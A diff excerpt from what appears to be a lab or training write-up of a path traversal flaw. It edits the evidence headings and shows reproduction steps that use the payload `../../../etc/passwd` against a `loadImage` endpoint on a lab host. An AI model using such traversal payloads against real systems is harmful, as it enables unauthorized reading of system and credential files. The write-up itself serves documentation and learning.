@@ -14,11 +14,11 @@ or restrict the path, an attacker can use traversal sequences to retrieve arbitr
 2. Modify the `filename` parameter to a traversal payload: `../../../etc/passwd`.
 3. Forward the request and observe the response contains the contents of `/etc/passwd`.
 
-## Evidence (sanitized)
-Request (sanitized):
+## Evidence
+Request:
 - `GET https://<lab-host>/loadImage?filename=../../../etc/passwd`
 
-Response (sanitized indicators):
+Response indicators:
 - `HTTP/2 200 OK`
 - Body contains lines resembling: `root:x:0:0:...`
 
